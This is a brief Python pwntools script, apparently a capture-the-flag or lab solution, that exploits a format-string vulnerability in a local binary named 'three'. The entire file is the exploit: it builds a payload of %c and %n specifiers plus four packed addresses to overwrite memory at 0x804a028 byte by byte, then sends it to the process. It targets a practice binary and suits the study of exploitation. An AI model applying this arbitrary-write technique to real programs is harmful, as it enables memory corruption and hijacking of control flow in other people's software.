from pwn import *

#cmds = '''
#tmux-setup
#'''

#elf = context.binary = ELF('./three')
#p = gdb.debug('./three', gdbscript=cmds)

p = process('./three')

addr = 0x804a028

payload = f"%197c%20$n".encode()
payload += f"%124c%21$n".encode()
payload += f"%125c%22$n".encode()
payload += f"%4c%23$n".encode()
payload += b"AA"
payload += p32(addr) + p32(addr+1) + p32(addr+2) + p32(addr+3)

p.sendline(payload)
# p.interactive()
print(p.recvall().decode(errors='replace'))
